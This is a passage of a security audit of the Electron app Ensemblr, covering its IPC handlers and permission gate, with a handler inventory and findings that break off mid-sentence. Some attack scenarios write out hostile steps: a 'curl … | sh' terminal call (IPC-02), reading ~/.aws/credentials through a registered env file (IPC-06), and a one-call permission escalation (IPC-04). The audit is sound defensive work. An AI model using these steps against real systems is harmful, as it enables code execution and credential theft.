# Audit 04 — Preload bridge, IPC handlers, request schemas, permission gate

The preload bridge is clean: `src/preload/bridge/ensemblr-api.ts` exposes only typed `invoke`
wrappers over a fixed channel map, subscriptions that return real unsubscribe functions, and no
raw `ipcRenderer`, no caller-chosen channel, no live Electron object. Input validation across the
178 `ipcMain` registrations is better than the "13 schema-less modules" headline suggests — most
of those parse through the aggregate `request-schemas.ts`, and the paths that reach `git`, `gh`,
and the clone URL are genuinely hardened (`--` separators, ref regexes, a GitHub-only URL parser).

The permission model is the problem. `security.permissionMode` is a **repository-scope** setting
in the resolver and in the UI, but every consumer — the IPC gate, agent sessions, and the
agent-control server — resolves it at **app scope**, where only the built-in
`workspace-trusted` default lives. Setting a repository to `read-only` therefore changes nothing
anywhere (IPC-01). Independently, only 11 of 178 registrations pass through the gate at all
(IPC-02), and the gate treats `confirmation-required` as a pass (IPC-03). SECURITY.md names
"any bypass of the workspace permission mode" as in scope; these are that, and they do not need a
compromised renderer to reach.

## Handler inventory

Legend — **Gate**: `—` ungated, otherwise the `PermissionActionKind` passed to
`withPermissionGate`. **Val**: `Zs` strict Zod `.parse`, `Zl` lenient `safeParse`/`null`-fallback,
`inline` hand-rolled checks, `none` no runtime validation. **Reaches**: fs / shell / db / net /
rndr (renderer-only) / win (BrowserWindow).

| Channel | Module:line | Gate | Val | Reaches | Verdict |
| --- | --- | --- | --- | --- | --- |
| agentControlReportBoardStatus | main.ts:1300 | — | none (cast) | rndr | ok |
| agentControlAnswerUserQuestion | main.ts:1332 | — | inline | rndr | ok |
| agentControlReviewBriefReply | main.ts:1370 | — | inline | rndr | ok |
| agentToolApprovalAnswered | claude-agent/claude-tool-approval-ipc.ts:107 | — | inline | rndr | ok |
| ensureWorkspaceSetup | ipc/handlers/workspace-scripts.ts:34 | — | none | shell | IPC-02 |
| runWorkspaceScript | ipc/handlers/workspace-scripts.ts:45 | — | none | shell | IPC-02 |
| stopWorkspaceScript | ipc/handlers/workspace-scripts.ts:59 | — | none | shell | ok |
| updateRepositoryScripts | ipc/handlers/workspace-scripts.ts:71 | — | Zl | fs, db | IPC-02 |
| githubRepositoryList | ipc/handlers/clone.ts:40 | — | Zl | net | ok |
| githubRemoteBranchList | ipc/handlers/clone.ts:49 | — | Zl | shell, net | ok |
| selectCloneDestination | ipc/handlers/clone.ts:58 | — | dialog | fs | ok |
| cloneGithubRepositoryPrepare | ipc/handlers/clone.ts:70 | — | Zl | fs | ok |
| cloneGithubRepositoryStart | ipc/handlers/clone.ts:79 | outside-workspace-write | Zl | shell, fs | IPC-03 |
| getAppSettings | ipc/handlers/app-settings.ts:28 | — | n/a | fs | ok |
| updateAppSettings | ipc/handlers/app-settings.ts:33 | — | Zs | fs | IPC-02 |
| openAppConfigFile | ipc/handlers/app-settings.ts:44 | — | n/a | fs, shell | ok |
| getSystemLanguages | ipc/handlers/app-settings.ts:56 | — | n/a | rndr | ok |
| activeChatContext | ipc/handlers/active-chat.ts:22 | — | inline | rndr | ok |
| reportConciergeVisibility | ipc/handlers/active-chat.ts:39 | — | inline | rndr | ok |
| selectLocalRepository | ipc/handlers/repository.ts:106 | — | dialog | fs | ok |
| registerLocalRepository | ipc/handlers/repository.ts:115 | — | Zl | fs, db | IPC-05 |
| quickStartProject | ipc/handlers/repository.ts:123 | — | Zl | fs, shell | IPC-02 |
| githubOwnerList | ipc/handlers/repository.ts:129 | — | n/a | net | ok |
| createWorkspace | ipc/handlers/repository.ts:134 | — | Zl | fs, shell | IPC-02 |
| sharedRootAdoption | ipc/handlers/repository.ts:140 | — | Zl | fs | ok |
| renameWorkspace | ipc/handlers/repository.ts:146 | — | Zl | fs, db | ok |
| setWorkspaceBaseBranch | ipc/handlers/repository.ts:152 | — | Zl | db | ok |
| archiveWorkspace | ipc/handlers/repository.ts:160 | — | Zl | fs, shell | IPC-02 |
| continueWorkspaceBranch | ipc/handlers/repository.ts:166 | — | Zl | shell | IPC-02 |
| deleteWorkspace | ipc/handlers/repository.ts:174 | workspace-archive-delete | Zl | fs | IPC-03 |
| deleteRepository | ipc/handlers/repository.ts:181 | repository-removal | Zl | fs, db | IPC-03 |
| listAllWorkspaces | ipc/handlers/repository.ts:188 | — | n/a | db | ok |
| listArchivedWorkspaces | ipc/handlers/repository.ts:193 | — | Zl | db | ok |
| unarchiveWorkspace | ipc/handlers/repository.ts:201 | — | Zl | fs | IPC-02 |
| deleteArchivedWorkspace | ipc/handlers/repository.ts:207 | workspace-archive-delete | Zl | fs | IPC-03 |
| runTextEditCommand | ipc/handlers/text-editing.ts:19 | — | Zs (enum) | win | ok |
| replaceMisspelling | ipc/handlers/text-editing.ts:29 | — | Zs | win | ok |
| addWordToDictionary | ipc/handlers/text-editing.ts:39 | — | Zs | win | ok |
| commitWorkspaceChanges | ipc/handlers/github.ts:22 | workspace-write | Zs | shell | IPC-05 |
| pushWorkspaceBranch | ipc/handlers/github.ts:30 | — | Zs | shell, net | IPC-02, IPC-05 |
| createPullRequest | ipc/handlers/github.ts:35 | — | Zs | shell, net | IPC-02, IPC-05 |
| getPullRequestSnapshot | ipc/handlers/github.ts:38 | — | Zs | shell, net | IPC-05 |
| mergePullRequest | ipc/handlers/github.ts:43 | pull-request-merge | Zs | shell, net | IPC-03 |
| updateRepositorySettings | ipc/handlers/repository-settings.ts:26 | — | Zl | db | IPC-04 |
| openRepositoryConfigFile | ipc/handlers/repository-settings.ts:32 | — | inline + allowlist | fs, shell | ok |
| rootDirectory | ipc/handlers/root.ts:29 | — | n/a | fs | ok |
| selectRootDirectory | ipc/handlers/root.ts:33 | — | dialog | fs | ok |
| confirmRootDirectoryChange | ipc/handlers/root.ts:65 | root-directory-change | Zl | fs | IPC-03 |
| repositoryWorkspaceNavigation | ipc/handlers/navigation.ts:18 | — | n/a | db | ok |
| openConciergeSession | ipc/handlers/concierge.ts:49 | — | Zs | shell, fs | IPC-02 |
| submitConciergePrompt | ipc/handlers/concierge.ts:63 | — | Zs | shell | IPC-02 |
| stopConciergeSession | ipc/handlers/concierge.ts:77 | — | Zs | rndr | ok |
| listConciergeEvents | ipc/handlers/concierge.ts:96 | — | Zs | db | ok |
| clearConciergeContext | ipc/handlers/concierge.ts:104 | — | Zs | db | ok |
| conciergeContextPressure | ipc/handlers/concierge.ts:119 | — | n/a | db | ok |
| listConciergeArtifacts | ipc/handlers/concierge.ts:129 | — | n/a | fs | ok |
| listRepositoryBranches | ipc/handlers/repository-sources.ts:20 | — | Zs | shell | ok |
| listRepositoryPullRequests | ipc/handlers/repository-sources.ts:25 | — | Zs | shell, net | ok |
| listRepositoryIssues | ipc/handlers/repository-sources.ts:32 | — | Zs | shell, net | ok |
| getArchitectureSnapshot | ipc/handlers/architecture.ts:47 | — | Zs | db | ok |
| settingsResolution | ipc/handlers/settings.ts:20 | — | inline (normalize) | fs, db | ok |
| environmentVariables | ipc/handlers/environment.ts:79 | — | n/a | db, secrets | ok (masked) |
| setEnvironmentVariable | ipc/handlers/environment.ts:85 | — | Zs | db, secrets | IPC-02 |
| unsetEnvironmentVariable | ipc/handlers/environment.ts:113 | — | Zs | db, secrets | IPC-02 |
| readEnvironmentVariableValue | ipc/handlers/environment.ts:127 | — | Zs | secrets → rndr | ok (see note) |
| listEnvFiles | ipc/handlers/environment.ts:139 | — | Zs | db | ok |
| addEnvFile | ipc/handlers/environment.ts:148 | — | Zs (no path check) | fs, db | IPC-06 |
| removeEnvFile | ipc/handlers/environment.ts:163 | — | Zs | db | ok |
| selectEnvFile | ipc/handlers/environment.ts:172 | — | dialog | fs | ok |
| infisicalAccounts | ipc/handlers/infisical.ts:37 | — | n/a | db, net | ok |
| infisicalAddAccount | ipc/handlers/infisical.ts:50 | — | Zs | secrets, net | ok |
| infisicalTestAccount | ipc/handlers/infisical.ts:64 | — | Zs | net | ok |
| infisicalRemoveAccount | ipc/handlers/infisical.ts:78 | — | Zs | secrets | ok |
| infisicalProjects | ipc/handlers/infisical.ts:92 | — | n/a | net | ok |
| infisicalLink | ipc/handlers/infisical.ts:109 | — | Zs | db | ok |
| infisicalSetLink | ipc/handlers/infisical.ts:123 | — | Zs | db | ok |
| infisicalClearLink | ipc/handlers/infisical.ts:137 | — | Zs | db | ok |
| infisicalSync | ipc/handlers/infisical.ts:151 | — | Zs | net, secrets | ok (names only) |
| setupDiagnostics | ipc/handlers/setup.ts:16 | — | n/a (no payload) | shell (probes) | ok |
| repositoryConfig | ipc/handlers/repository-config.ts:21 | — | Zs | fs | ok |
| menuContext | ipc/handlers/menu.ts:32 | — | Zl | win | ok |
| getMenuBar | ipc/handlers/menu.ts:50 | — | n/a | rndr | ok |
| invokeMenuBarItem | ipc/handlers/menu.ts:55 | — | Zl | win | ok |
| getAgentProviderReadiness | ipc/handlers/agent-provider.ts:46 | — | Zs | shell | ok |
| listAgentProviderMcpServers | ipc/handlers/agent-provider.ts:55 | — | Zs | shell | ok |
| listAgentProviderSlashCommands | ipc/handlers/agent-provider.ts:68 | — | Zs | shell, fs | ok |
| getAgentProviderExecutablePath | ipc/handlers/agent-provider.ts:81 | — | Zs | db | ok |
| setAgentProviderExecutablePath | ipc/handlers/agent-provider.ts:93 | — | Zs (`path` free-form) | db → shell | IPC-02 |
| clearAgentProviderExecutablePath | ipc/handlers/agent-provider.ts:106 | — | Zs | db | ok |
| selectAgentProviderExecutable | ipc/handlers/agent-provider.ts:118 | — | dialog | fs | ok |
| openAgentProviderSettingsFile | ipc/handlers/agent-provider.ts:138 | — | Zs | fs, shell | ok |
| listReviewComments | ipc/handlers/review.ts:26 | — | Zs | db | ok |
| saveReviewComment | ipc/handlers/review.ts:32 | — | Zs | db | ok |
| deleteReviewComment | ipc/handlers/review.ts:38 | — | Zs | db | ok |
| listReviewTodos | ipc/handlers/review.ts:44 | — | Zs | db | ok |
| saveReviewTodo | ipc/handlers/review.ts:50 | — | Zs | db | ok |
| deleteReviewTodo | ipc/handlers/review.ts:56 | — | Zs | db | ok |
| listAgentHarnesses | ipc/handlers/agents.ts:116 | — | n/a | shell | ok |
| launchAgentHarness | ipc/handlers/agents.ts:124 | — | Zs (registry id) | shell | IPC-02 |
| resumeAgentHarness | ipc/handlers/agents.ts:151 | — | Zs + id guard | shell | IPC-02 |
| initialShellSnapshot (`ipcMain.on`, sync) | ipc/handlers/shell-snapshot.ts:39 | — | no payload | db, fs | IPC-10 |
| selectLinkedDirectory | ipc/handlers/linked-directories.ts:23 | — | dialog | fs | ok |
| listLinkedDirectoryRecents | ipc/handlers/linked-directories.ts:34 | — | n/a | db | ok |
| recordLinkedDirectoryRecent | ipc/handlers/linked-directories.ts:40 | — | Zs | db | ok |
| forgetLinkedDirectoryRecent | ipc/handlers/linked-directories.ts:46 | — | Zs | db | ok |
| listWorkspaceFiles | ipc/handlers/workspace-files.ts:37 | — | none | fs | IPC-08 |
| readWorkspaceFile | ipc/handlers/workspace-files.ts:45 | — | Zl | fs → rndr | ok (see IPC-08 note) |
| readWorkspaceDirectory | ipc/handlers/workspace-files.ts:61 | — | none | fs | IPC-08 |
| writeWorkspaceImageAttachment | ipc/handlers/workspace-files.ts:69 | workspace-write | Zs | fs | ok |
| writeWorkspaceFileAttachment | ipc/handlers/workspace-files.ts:92 | workspace-write | Zs | fs | ok |
| writeWorkspaceActionPrompt | ipc/handlers/workspace-files.ts:115 | workspace-write | Zs | fs | ok |
| watchWorkspaceFiles | ipc/handlers/workspace-files.ts:135 | — | none | fs | IPC-07 |
| unwatchWorkspaceFiles | ipc/handlers/workspace-files.ts:141 | — | none | fs | IPC-07 |
| listAllChatTabs | ipc/handlers/chat-tab.ts:54 | — | Zs | db | ok |
| listChatTabs | ipc/handlers/chat-tab.ts:65 | — | Zs | db | ok |
| openChatTab | ipc/handlers/chat-tab.ts:77 | — | Zs | db | ok |
| pinChatTab | ipc/handlers/chat-tab.ts:86 | — | Zs | db | ok |
| closeChatTab | ipc/handlers/chat-tab.ts:95 | — | Zs | db | ok |
| reorderChatTabs | ipc/handlers/chat-tab.ts:121 | — | Zs | db | ok |
| restoreChatTab | ipc/handlers/chat-tab.ts:130 | — | Zs | db | ok |
| bindAgentSessionToChatTab | ipc/handlers/chat-tab.ts:139 | — | Zs | db | ok |
| listChatTabSummaries | ipc/handlers/chat-tab.ts:148 | — | Zs | db | ok |
| linearConnectionStatus | ipc/handlers/linear.ts:31 | — | Zs | db, secrets | ok |
| linearStartLogin | ipc/handlers/linear.ts:38 | — | n/a | net | ok |
| linearCancelLogin | ipc/handlers/linear.ts:45 | — | n/a | net | ok |
| linearDisconnect | ipc/handlers/linear.ts:49 | — | Zs | secrets | ok |
| linearListIssues | ipc/handlers/linear.ts:58 | — | Zs | net | ok |
| linearGetIssue | ipc/handlers/linear.ts:62 | — | Zs | net | ok |
| linearMetadata | ipc/handlers/linear.ts:66 | — | Zs | net | ok |
| linearCreateIssue | ipc/handlers/linear.ts:70 | — | Zs | net | ok |
| linearUpdateIssue | ipc/handlers/linear.ts:74 | — | Zs | net | ok |
| linearCreateComment | ipc/handlers/linear.ts:78 | — | Zs | net | ok |
| health | ipc/handlers/health.ts:21 | — | n/a | db, fs | ok |
| createTerminalSession | ipc/handlers/terminal.ts:32 | — | none | shell | IPC-02 |
| listRestorableTerminals | ipc/handlers/terminal.ts:50 | — | none | db | ok |
| killTerminalSession | ipc/handlers/terminal.ts:60 | — | none | shell | ok |
| closeTerminalSession | ipc/handlers/terminal.ts:87 | — | none | shell, fs | ok |
| listTerminalSessions | ipc/handlers/terminal.ts:112 | — | none | db | ok |
| terminalSnapshot | ipc/handlers/terminal.ts:122 | — | none | fs | ok |
| resizeTerminalSession | ipc/handlers/terminal.ts:128 | — | none + clamp | shell | ok |
| writeTerminalSession | ipc/handlers/terminal.ts:142 | — | none + 64 KiB cap | shell | IPC-02 |
| openExternal | ipc/handlers/window.ts:19 | — | inline (http/https only) | os | ok |
| closeWindow | ipc/handlers/window.ts:26 | — | n/a | win | ok |
| minimizeWindow | ipc/handlers/window.ts:30 | — | n/a | win | ok |
| toggleMaximizeWindow | ipc/handlers/window.ts:38 | — | n/a | win | ok |
| relaunchApp | ipc/handlers/window.ts:52 | — | n/a | win | ok |
| getWorkspaceGitStatus | ipc/handlers/workspace-git.ts:25 | — | Zs | shell | IPC-05 |
| getWorkspaceFileDiff | ipc/handlers/workspace-git.ts:32 | — | Zs | shell | IPC-05 |
| getWorkspaceMergeConflicts | ipc/handlers/workspace-git.ts:39 | — | Zs | shell, net | IPC-05 |
| getWorkspaceCommits | ipc/handlers/workspace-git.ts:46 | — | Zs | shell | IPC-05 |
| discardWorkspaceChanges | ipc/handlers/workspace-git.ts:53 | — | Zs | shell, fs | IPC-02, IPC-05 |
| openAgentSession | ipc/handlers/agent-session.ts:138 | — | Zs | shell | IPC-02 |
| submitAgentPrompt | ipc/handlers/agent-session.ts:207 | — | Zs | shell | IPC-02 |
| setAgentPlanMode | ipc/handlers/agent-session.ts:252 | — | Zs | rndr | ok |
| refreshAgentPlanUsage | ipc/handlers/agent-session.ts:266 | — | Zs | net | ok |
| stopAgentSession | ipc/handlers/agent-session.ts:282 | — | Zs | shell | ok |
| listAgentSessions | ipc/handlers/agent-session.ts:298 | — | Zs | db | ok |
| listAgentModels | ipc/handlers/agent-session.ts:311 | — | n/a | shell | ok |
| listAgentSessionEvents | ipc/handlers/agent-session.ts:316 | — | Zs | db | IPC-09 |
| writeForkSummary | ipc/handlers/agent-session.ts:335 | workspace-write | Zs | fs | ok |
| listTurnCheckpoints | ipc/handlers/checkpoint.ts:45 | — | Zs | db | ok |
| computeTurnDiff | ipc/handlers/checkpoint.ts:58 | — | Zs | shell | ok |
| restoreCheckpoint | ipc/handlers/checkpoint.ts:82 | — | Zs + `confirm: true` | shell, fs | IPC-02 |
| transcribeAudio | ipc/handlers/dictation.ts:26 | — | Zs + byte cap | net | ok |
| dictationKeyStatus | ipc/handlers/dictation.ts:34 | — | n/a | secrets | ok (no value) |
| setDictationApiKey | ipc/handlers/dictation.ts:39 | — | Zs (≤512) | secrets | ok |
| clearDictationApiKey | ipc/handlers/dictation.ts:47 | — | n/a | secrets | ok |
| listWorkspaceOpenTargets | ipc/handlers/open-target.ts:38 | — | n/a | shell | ok |
| openSettingsFileInTarget | ipc/handlers/open-target.ts:46 | — | inline + allowlist | fs, shell | ok |
| openWorkspaceInTarget | ipc/handlers/open-target.ts:80 | — | inline + sanitize | shell | ok |
| previewSettingsPublication | ipc/handlers/settings-publication.ts:39 | — | Zs | fs | ok |
| applySettingsPublication | ipc/handlers/settings-publication.ts:50 | — | Zs | fs | IPC-02 |
| cleanupSettingsPublication | ipc/handlers/settings-publication.ts:65 | — | Zs | fs | IPC-02 |
| restoreSettingsPublication | ipc/handlers/settings-publication.ts:76 | — | Zs | fs | IPC-02 |
| settingsPublicationRecoveryStatus | ipc/handlers/settings-publication.ts:87 | — | Zs | fs | ok |
| updateStatus | ipc/handlers/update.ts:19 | — | no payload | net | ok |
| checkForUpdates | ipc/handlers/update.ts:23 | — | no payload | net | ok |
| installUpdate | ipc/handlers/update.ts:27 | — | no payload | fs | ok |

## Findings

### [IPC-01] The per-repository permission mode is never the one that is enforced

- Severity: **High**
- Confidence: **Confirmed**
- Where: `src/main/ipc/permission-gate.ts:107`, `src/main/ipc/handlers.ts:268`,
  `src/main/main.ts:962`, `src/main/main.ts:1545`

```ts
// permission-gate.ts:107 — reads snapshot.app, never snapshot.repository
const setting = snapshot.app.settings.find(
    (entry) => entry.key === 'security.permissionMode',
);
// handlers.ts:268 — resolve() called with no repository argument
getMode: () => readPermissionModeFromSnapshot(settingsResolutionService.resolve()),
```

**What.** `security.permissionMode` is a repository-scope setting. It is declared in
`REPOSITORY_BUILT_IN_DEFAULTS` (`src/main/config/config-resolution.ts:115`), listed in the
renderer's `REPO_SETTINGS_KEYS` (`src/renderer/state/preferences/atoms.ts:353`), edited on the
per-repo screen (`src/renderer/routing/routes/_workbench/settings/repo/$repoId/security.tsx:42`),
and written as a repository-scoped SQLite row by `useRepoSettingsWriter` →
`updateRepositorySettings` → `upsertRepositorySettings`. SECURITY.md says the same: "set per
repository under Settings → Repo → Security."

All three consumers resolve it at app scope. `settingsResolutionService.resolve()` with no
argument does not even compute the repository group (`config-resolution.ts:189-266` is inside
`if (repository)`), so `snapshot.repository` is `undefined` and the app-scope lookup falls through
to `collectAppBuiltInDefaults` (`config-resolution.ts:515`), which is the constant
`workspace-trusted`. Nothing in the UI writes an app-scope `security.permissionMode` row.

**Scenario.** User sets repo `acme/api` to `read-only`. The row lands at
`scope='repository', scope_id=<repoId>`. The gate calls `resolve()`, gets `workspace-trusted`,
and `classifyPermissionAction` returns `allowed` for `workspace-write`. The same value is handed
to every new agent session (`src/main/agent-runtime/session/session-open.ts:427,544`) and to the
agent-control op gate (`src/main/agent-control/agent-control-service.ts:1174`), so the Claude
adapter is launched with `bypassPermissions` (`claude-permission-bridge.ts:90`) on a repository
the user marked read-only. No renderer compromise required.

**Existing guards & tests checked.** None. There is no test anywhere that exercises
`createPermissionGate` or `readPermissionModeFromSnapshot` — grepping `tests/` for either name
returns no hits, and `tests/main/permissions.test.ts` covers only the pure classifier.

**Fix.** Make mode resolution repository-aware and make the call site carry the repository. The
gate and the session/control resolvers should take the workspace (or repository) id of the
request and call `resolve({ repository: { repositoryId, repositoryPath } })`, then read
`snapshot.repository ?? snapshot.app`. Add a regression test that a repository-scoped
`read-only` row blocks a `workspace-write` channel. Because the gate's handler signature has no
workspace id today, this means threading one through `WithPermissionGate` (or resolving it from
the request payload's `workspaceId`/`workspaceCwd`) rather than a snapshot read alone.

### [IPC-02] Read-only and approval-required are unenforced on every write channel but eleven

- Severity: **High**
- Confidence: **Confirmed**
- Where: `src/main/ipc/handlers.ts:273-408` (only six groups receive `withPermissionGate`)

```ts
registerTerminalHandlers({ terminalService });                 // handlers.ts:366 — ungated
registerWorkspaceScriptHandlers({ databaseService, scriptLifecycleService }); // :376 — ungated
registerWorkspaceGitHandlers({ workspaceGitService: ... });    // :384 — ungated
registerCheckpointHandlers({ databaseService });               // :352 — ungated
```

**What.** Of 178 `ipcMain` registrations, 11 pass through the permission gate: three
attachment writes, `writeForkSummary`, `commitWorkspaceChanges`, `mergePullRequest`, three
delete channels, `cloneGithubRepositoryStart`, `confirmRootDirectoryChange`. Everything else is
registered with a bare `ipcMain.handle`, including every channel that executes a command or
mutates the workspace: `createTerminalSession` / `writeTerminalSession` (a PTY running
`sh -c <renderer-supplied command>`, `terminal-service.ts:1437-1451`, `buildShellArgs` at
`:1921`), `runWorkspaceScript`, `ensureWorkspaceSetup`, `discardWorkspaceChanges`,
`restoreCheckpoint`, `updateRepositoryScripts` (rewrites the committed
`.ensemblr/settings.toml`), `applySettingsPublication`, `openAgentSession`, `submitAgentPrompt`,
`launchAgentHarness`, `createWorkspace`, `archiveWorkspace`, `pushWorkspaceBranch`,
`createPullRequest`, `updateAppSettings`, `setAgentProviderExecutablePath`.

`classifyPermissionAction`'s own reason string hedges this — "where enforcement is available"
(`src/shared/permissions.ts:163`) — but the user-facing copy on the Security screen does not:
"How much an agent may do on its own in this repository. Applies to every workspace of the repo,
and to the tools agents reach over the control server." Agents reached over the control server
are gated (`agent-control-service.ts:1174`); the renderer's own IPC surface is not.

**Scenario.** Repository is set to `read-only` (and IPC-01 is fixed so the mode resolves). A
compromised renderer — XSS through agent-authored markdown, a Linear issue body, a PR
description — calls `window.ensemblr.createTerminalSession({ workspaceId, command: 'curl … | sh' })`
and gets arbitrary execution in the workspace with the user's full shell environment. The same
renderer can `restoreCheckpoint` (hard-resets the worktree) or `discardWorkspaceChanges`.

**Existing guards & tests checked.** `tests/main/workspace-scripts-handler.test.ts` covers the
TOML write path, not permission. No handler test asserts a mode-based denial.

**Fix.** Route every mutating registration through `withPermissionGate` with the right
`PermissionActionKind` — `workspace-command` for terminal create/write, script run, harness
launch, and agent session open/submit; `workspace-write` for discard, checkpoint restore, and the
settings-publication writes; `app-settings-change` for `updateAppSettings`,
`setAgentProviderExecutablePath`, and `updateRepositorySettings`. A lint or test that asserts
every channel in `IPC_CHANNELS` is either gated or on an explicit read-only allowlist would keep
the list from drifting again.

### [IPC-03] `confirmation-required` is a pass-through in the gate, and read-only inverts

- Severity: **Medium**
- Confidence: **Confirmed**
- Where: `src/main/ipc/permission-gate.ts:79-92`, `src/shared/permissions.ts:57-65,150-158`

```ts
if (mode !== 'allow-all') {
    const snapshot = classifyPermissionAction({ action, mode });
    if (snapshot.boundary === 'blocked') { throw new PermissionGateDeniedError(...); }
}
return handler(event, ...args);   // 'confirmation-required' falls straight through
```

**What.** Two consequences. (a) Every action in `SENSITIVE_ACTIONS` — `app-settings-change`,
`outside-workspace-write`, `pi-global-config-change`, `pull-request-merge`,
`repository-removal`, `root-directory-change`, `workspace-archive-delete` — classifies as
`confirmation-required` in *all three* modes (`permissions.ts:150`, checked before the mode
branches), and the gate has no confirmation port, so those five gated channels
(`deleteWorkspace`, `deleteRepository`, `deleteArchivedWorkspace`, `mergePullRequest`,
`cloneGithubRepositoryStart`, `confirmRootDirectoryChange`) are effectively ungated. The
agent-control path does have a `ports.confirm.confirm` for exactly this boundary
(`agent-control-service.ts:1186`); the IPC gate has none. (b) Because the sensitive check runs
first, `outside-workspace-write` is *permitted* under `read-only` while the narrower
`workspace-write` is blocked — writing outside the workspace is easier than writing inside it.

**Scenario.** Repository in `read-only`. `cloneGithubRepositoryStart` (action
`outside-workspace-write`) succeeds; `writeWorkspaceFileAttachment` (action `workspace-write`)
is denied. A compromised renderer calls `deleteRepository` and the gate raises no dialog.

**Fix.** Give the gate a confirmation port mirroring the control server's, and make it await a
native dialog on `confirmation-required`. Separately, move the `SENSITIVE_ACTIONS` check below
the `read-only` branch in `classifyPermissionAction` so read-only blocks the wider action too,
and add a case to `tests/main/permissions.test.ts` pinning `outside-workspace-write` +
`read-only` → `blocked`.

### [IPC-04] The permission mode itself is writable over an ungated channel

- Severity: **Medium**
- Confidence: **Confirmed**
- Where: `src/main/ipc/request-schemas/workspace-scripts.ts:75`,
  `src/main/ipc/handlers/repository-settings.ts:26`

```ts
const repositorySettingsPatchSchema = z.object({
    ...
    permissionMode: z.enum(PERMISSION_MODES).nullable().optional(),
});
```

**What.** `updateRepositorySettings` is registered with a bare `ipcMain.handle` and accepts
`settings.permissionMode`, writing it straight to the repository-scoped settings row. It is the
one setting whose whole purpose is to constrain what the app may do, and it carries no gate.

**Scenario.** Today this is inert because of IPC-01 — nothing reads the repo-scope value. The
moment IPC-01 is fixed, a compromised renderer restores full capability with one call:
`window.ensemblr.updateRepositorySettings({ repositoryId, settings: { permissionMode: 'workspace-trusted' } })`,
then proceeds through the IPC-02 channels. Fix IPC-01 without this and the escalation becomes
live.

**Existing guards & tests checked.** `tests/main/permissions.test.ts` covers the classifier only;
nothing asserts who may write the mode.

**Fix.** Gate `updateRepositorySettings` at `app-settings-change` (so it hits the confirmation
path once IPC-03 is fixed), or split `permissionMode` onto its own gated channel so the Git/Misc
settings writes stay cheap. Do this in the same change as IPC-01.

### [IPC-05] `workspaceCwd` is accepted as any absolute path, never matched to a known workspace

- Severity: **Medium**
- Confidence: **Confirmed**
- Where: `src/main/workspace-files/workspace-cwd.ts:13-24`

```ts
const cwd = workspaceCwd?.trim();
if (!cwd || !path.isAbsolute(cwd)) {
    return { message: 'Workspace path must be an absolute filesystem path.', ok: false };
}
return { cwd, ok: true };
```

**What.** Every `workspaceCwd`-bearing schema is `z.string().min(1)`, and the only downstream
check is "is it absolute". The workspace-git family, the GitHub family, and the file watcher all
run against whatever directory the renderer names. Sibling channels do this correctly —
`openWorkspaceInTarget` resolves the path from `workspaceId` via
`getWorkspacePathById` (`handlers/open-target.ts:95`), `openRepositoryConfigFile` and
`openSettingsFileInTarget` both call `isRepositoryConfigPathAllowed`, and
`updateRepositoryScripts` calls `resolveWritableWorkspaceCheckout`. The git and GitHub paths were
not given the same treatment.

**Scenario.** A compromised renderer calls
`discardWorkspaceChanges({ workspaceCwd: '/Users/me/other-project', paths: [...] })` and destroys
uncommitted work in a repository Ensemblr never opened, or `pushWorkspaceBranch` on one it was
never meant to touch. The argument handling itself is sound — `validateRelativePath` rejects
escaping paths and `discardSinglePath` uses `--` (`workspace-git-status.ts:794,815`) — so the
blast radius is "the wrong repository", not "arbitrary file".

**Fix.** Resolve the checkout from `workspaceId` in the handler (the pattern
`handlers/open-target.ts:95` already uses), or add a `resolveKnownWorkspaceCwd` that confirms the
path against the workspaces table before `resolveWorkspaceCwd` returns it.

### [IPC-06] `addEnvFile` accepts any existing absolute path as an environment source

- Severity: **Medium**
- Confidence: **Confirmed**
- Where: `src/main/environment/environment-variables.ts:563-579`,
  `src/main/ipc/handlers/environment.ts:148`

```ts
const filePath = input.path.trim();
if (!filePath) { throw new EnvironmentVariablesError('invalid-key', ...); }
if (!envFilePathExists(filePath)) { throw new EnvironmentVariablesError('env-file-not-found', ...); }
// no containment or extension check follows
```

**What.** The handler's schema is `{ path: z.string(), scope, scopeId }` with no path
constraint, and the service only checks existence. The registered file is then parsed and layered
into the environment of every terminal and script launched in that scope
(`src/main/environment/environment-assembly.ts:37-62`). The intended entry point is the native
picker (`selectEnvFile`, `handlers/environment.ts:172`), which the IPC channel bypasses.

**Scenario.** A compromised renderer registers `~/.aws/credentials` as a workspace env file, then
launches a terminal and reads the values back out of the PTY output broadcast. The parser does
accept that file's shape: `parseEnvFileContents` trims around the `=`
(`parse-env-file.ts:46`) and `ENVIRONMENT_VARIABLE_KEY_PATTERN` is
`/^[A-Za-z_][A-Za-z0-9_]*$/` (`environment-variable-keys.ts:12`), so `aws_access_key_id = AKIA…`
parses to a variable and the `[default]` section header is skipped for having no `=`.
`envFilePathExists` also expands `~` (`parse-env-file.ts:104`), so the renderer does not need to
know the home path. The mitigating factor is the hop: the values reach the renderer only through
a terminal it also has to launch.

**Existing guards & tests checked.** The snapshot path does *not* leak the values — env-file
content never enters `createVariableSnapshots` (`environment-variable-snapshots.ts:28-35` builds
its key set from catalog/infisical/plain/secret/invalid/required only), and
`readEnvironmentVariableValue` reads SQLite and the secret store, not env files
(`environment-variables.ts:508-537`). So the leak needs the terminal hop.

**Fix.** Constrain `addEnvFile` to paths inside the scope's workspace/repository, or to a path the
user picked in this session; keep the picker as the only free-form source.

### [IPC-07] `watchWorkspaceFiles` is unvalidated and uncapped

- Severity: **Low**
- Confidence: **Confirmed**
- Where: `src/main/ipc/handlers/workspace-files.ts:135-146`

```ts
ipcMain.handle(IPC_CHANNELS.watchWorkspaceFiles, (_event, request: WatchWorkspaceFilesRequest): void => {
    workspaceFilesWatcher.watch(request.workspaceCwd);
});
```

**What.** No schema, no path check, and `watch-workspace-files.ts:104` keeps entries in an
unbounded `Map`. On Linux each recursive watch walks the tree and registers an inotify watch per
directory (`linux-recursive-watch.ts`), which `.claude/rules/stack.md` documents as ~1.9 s of
blocked main event loop on a `node_modules`-sized tree.

**Scenario.** A loop of `watchWorkspaceFiles` over enumerated directories freezes the main
process and exhausts the inotify watch limit. Also reachable accidentally by a renderer bug.

**Fix.** Add a Zod schema, resolve the path against the known-workspace set (IPC-05's fix covers
this), and cap the number of concurrent entries.

### [IPC-08] Three `workspace-files` read channels have no runtime validation

- Severity: **Low**
- Confidence: **Confirmed**
- Where: `src/main/ipc/handlers/workspace-files.ts:37,61` (plus `:135,141`, see IPC-07)

**What.** `listWorkspaceFiles` and `readWorkspaceDirectory` take a TypeScript-typed `request`
with no parse, so a malformed payload reaches `fs` calls as whatever the renderer sent. The
sibling `readWorkspaceFile` on the same surface does `safeParse` with 4096-char caps
(`request-schemas/workspace-files.ts:22`), so this is inconsistency rather than an absent
decision.

**Note on the preview read.** `readWorkspaceFile` reading outside the workspace is deliberate
